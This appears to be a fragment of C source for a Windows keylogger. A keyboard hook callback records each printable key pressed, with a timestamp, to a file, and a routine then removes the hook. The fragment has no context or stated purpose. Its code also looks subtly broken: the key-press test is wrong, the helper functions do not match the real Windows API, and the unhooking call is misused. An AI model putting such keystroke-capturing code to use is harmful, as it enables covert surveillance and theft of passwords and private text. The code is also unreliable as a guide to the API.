LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        if (wParam == 1) // Key is pressed
        {
            key_count++;
            GetKeyName(wParam, key, 10);
            time(&current_time);
            if (fptr && isprint(key[0]))
            {
                fprintf(fptr, "%s %d\n", key, current_time);
            }
        }
    }
    return 0;
}

void StopHook()
{
    KillTimer(GetCurrentWindow(), timer);
    timer = 0;
    hhook = SetWindowsHook(0, NULL);
}

